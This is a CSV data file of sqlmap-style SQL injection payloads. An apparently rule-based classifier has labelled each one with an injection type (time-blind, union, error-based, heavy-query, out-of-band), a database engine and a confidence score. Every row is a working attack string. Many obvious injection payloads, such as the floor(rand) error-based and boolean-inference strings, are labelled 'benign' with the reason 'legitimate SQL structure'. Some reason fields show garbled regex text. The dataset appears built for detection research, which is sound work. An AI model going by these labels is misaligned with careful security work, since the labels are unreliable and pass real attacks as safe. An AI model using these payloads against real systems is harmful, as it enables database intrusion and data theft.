id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25274,"1' and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25275,"-8436' ) as frmf where 7225 = 7225 or make_set ( 9354 = 9354,7185 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25276,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'pfle' like 'pfle,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25277,"1"" ) as uyns where 4751 = 4751 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25278,"1' ) and elt ( 4249 = 4249,7259 ) and ( 'ifca' like 'ifca",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25279,"-2625"" ) ) as qfuo where 1980 = 1980 union all select 1980,1980,1980--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25280,"1"" ) ) ) waitfor delay '0:0:5' and ( ( ( ""tuhy"" like ""tuhy",time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
25281,"1' ) where 3330 = 3330 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25282,"1' ) where 9226 = 9226 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25283,"1"" ) ) as uqkn where 4642 = 4642 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25284,"1' ) union all select null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25285,"1"" ) ) as knyf where 8109 = 8109 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25286,"1' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'ccsb' = 'ccsb",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25287,"1 ) ) as pjjz where 8384 = 8384 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25288,"1' ) as uytv where 7875 = 7875 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25289,"select * from generate_series ( 3341,3341,case when ( 3341 = 3072 ) then 1 else 0 end ) limit 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25290,"-4407"" ) where 2055 = 2055 or elt ( 9714 = 5040,5040 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25291,"-5898"" ) ) as fycd where 7135 = 7135 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25292,"1"" where 8978 = 8978 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25293,"1' ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25294,"1' ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 'stqq' = 'stqq",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25295,"1 ) ) as vycb where 3524 = 3524 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25296,"-3731' ) ) ) or elt ( 7540 = 1412,1412 ) and ( ( ( 'iwch' = 'iwch",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25297,"1"" ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""zzcd"" = ""zzcd",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25298,-2951 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) # gwqv,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25299,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( 6977 = 6977",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25300,"1"" ) as pkkx where 6716 = 6716 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
25301,"1' ) as juxt where 5956 = 5956 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25302,1' ) ) as zffq where 9572 = 9572 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25303,"1 ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25304,"1' ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25305,"-4746%"" ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""%"" = """,error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
25306,"-1157 ) ) as sxie where 7118 = 7118 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
25307,"1"" ) and make_set ( 4553 = 8132,8132 ) and ( ""pfci"" like ""pfci",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25308,"-2211"" or 2113 = 8885#",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25309,1' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'nfix' = 'nfix,out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
25310,"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25311,"1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and 'efpc' like 'efpc",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25312,"1 ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 6265 = 6265",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25313,"1"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( ""uncg"" = ""uncg",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25314,1%' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25315,( select ( case when ( 9337 = 9337 ) then waitfor delay '0:0:5' else 9337* ( select 9337 from master..sysdatabases ) end ) ),time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
25316,"1' in boolean mode ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) #",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25317,"-8725"" ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( ""vblw"" like ""vblw",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25318,1%' ) ),unknown,generic,0.50,Insufficient information to classify,1
25319,1' and 5835 = 6157 and 'bjee' like 'bjee,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25320,"make_set ( 5679 = 9769,9769 )",unknown,generic,0.50,Insufficient information to classify,1
25321,1 ) where 5629 = 5629,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25322,"-4528"" ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""fxmt"" like ""fxmt",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25323,-7636' ) or 5898 = 8880 and ( 'sjuv' = 'sjuv,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25324,"-3747"" ) union all select 8962,8962,8962,8962,8962#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25325,"-8893 ) union all select 7594,7594,7594,7594,7594,7594#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25326,1 ) or sleep ( 5 ) and ( 2211 = 2211,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25327,1'|| ( select 'lnhq' where 7526 = 7526,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25328,-8513 ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 5818 = 5818,out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
25329,1%' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( '%' = ',time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25330,"1"" ) where 4520 = 4520",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25331,1' where 8945 = 8945 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25332,"1%"" and 7533 = 7533 and ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25333,"-6996%"" or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25334,"1'|| ( select 'qjwf' from dual where 3187 = 3187 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ) ||'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25335,"1"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""cdai"" = ""cdai",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25336,"1', ( select 6825 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6825 = 6825,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25337,"-1258"" ) ) union all select 7734,7734,7734#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25338,1 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) # lexm,out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
25339,"1' and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'lywy' like 'lywy",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25340,1 where 6518 = 6518,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25341,"1%"" and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25342,"1' ) where 5071 = 5071 union all select null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25343,1' where 5547 = 5547,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
